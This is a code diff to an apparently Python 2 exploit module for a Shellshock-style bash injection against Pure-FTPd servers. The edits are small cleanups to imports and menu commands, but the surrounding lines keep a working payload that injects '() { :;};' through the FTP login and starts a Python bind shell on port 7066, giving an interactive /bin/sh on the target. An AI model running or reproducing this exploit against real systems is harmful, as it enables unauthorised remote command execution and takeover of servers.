@@ -1,6 +1,6 @@
 import ftplib
 import cmd
-import random
+from random import sample
 import string
 from socket import AF_INET, SOCK_STREAM, socket, gethostbyname
 
@@ -50,7 +50,9 @@ class pureftpdBashInjectionMenu(cmd.Cmd):
     print "Usage: show options"
     print "show options: show the variables, current values, and descriptions"
   def do_show(self, args):
-    print "Targets: Linux x86 & Linux x86 64-bit"
+    if args != "options":
+      print "*** Unknown argument: " + args
+    print "Targets: Linux x86 & Linux x64"
     print "Options for pureftpd_bash_injection:"
     print "========================"
     print "rpath    %s    the target path where binaries (ls, sh, ps, etc) are kept" % self.rpath[0]
@@ -61,6 +63,7 @@ class pureftpdBashInjectionMenu(cmd.Cmd):
     print "exit: exit the pureftpd_bash_injection context"
   def do_exit(self, args):
     if args:
+      print "*** Argument number: needed 0"
       return
     return True
   def help_start(self):
@@ -77,7 +80,7 @@ class pureftpdBashInjectionMenu(cmd.Cmd):
       shell = "python -c 'import os, subprocess; from socket import *; s = socket(AF_INET, SOCK_STREAM); s.bind((\"localhost\", 7066)); s.listen(5); client, addr = s.accept(); os.dup2(client.fileno(), 0); os.dup2(client.fileno(), 1); os.dup2(client.fileno(), 2); p = subprocess.call([\"/bin/sh\", \"-i\"])' &"
     payload = "() { :;}; %s/sh -c %s" % (self.rpath[0], shell)
     s = string.lowercase + string.digits
-    user = ''.join(random.sample(s, 20))
+    user = ''.join(sample(s, 20))
     print "[+]Payload generated."
     print "[*]Sending payload: " + payload
     s = socket(AF_INET, SOCK_STREAM)
